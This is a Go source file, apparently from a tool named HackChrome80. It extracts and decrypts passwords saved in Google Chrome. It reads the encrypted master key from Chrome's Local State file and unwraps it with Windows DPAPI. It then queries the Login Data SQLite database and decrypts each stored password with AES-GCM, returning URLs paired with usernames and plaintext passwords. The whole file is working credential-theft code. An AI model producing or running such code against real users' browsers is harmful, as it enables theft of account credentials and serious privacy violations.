package core

import (
	"HackChrome80/utils"
	"database/sql"
	"encoding/base64"
	"fmt"
	"github.com/tidwall/gjson"
	"io/ioutil"
)

func GetMaster(key_file string) ([]byte, error){
	res, _ := ioutil.ReadFile(key_file)
	master_key, err := base64.StdEncoding.DecodeString(gjson.Get(string(res), "os_crypt.encrypted_key").String())
	if err != nil{
		return []byte{}, err
	}
	// remove string: DPAPI
	master_key = master_key[5:]
	master_key, err = utils.WinDecypt(master_key)
	if err != nil{
		return []byte{}, err
	}
	return master_key, nil
}

func decrypt_password(pwd, master_key []byte) ([]byte, error){
	nounce := pwd[3:15]
	payload := pwd[15:]
	plain_pwd, err := utils.AesGCMDecrypt(payload, master_key, nounce)
	if err != nil{
		return []byte{}, nil
	}
	return plain_pwd, nil
}

func GetPwd(pwd_db string, master_key []byte) map[string](map[string]string){
	result := make(map[string](map[string]string))
	db, err := sql.Open("sqlite3", pwd_db)
	if err != nil{
		fmt.Println(err)
	}
	defer db.Close()
	rows, _ := db.Query(`SELECT action_url, username_value, password_value FROM logins`)
	for rows.Next() {
		var url string
		var username string
		var encrypted_pwd []byte
		err = rows.Scan(&url, &username, &encrypted_pwd)
		decrypted_pwd, err := decrypt_password(encrypted_pwd, master_key)
		if err != nil{
			continue
		}
		if len(url)>0 {
			result[url] = map[string]string{"username": username, "password": string(decrypted_pwd)}
		}
	}

	return result
}
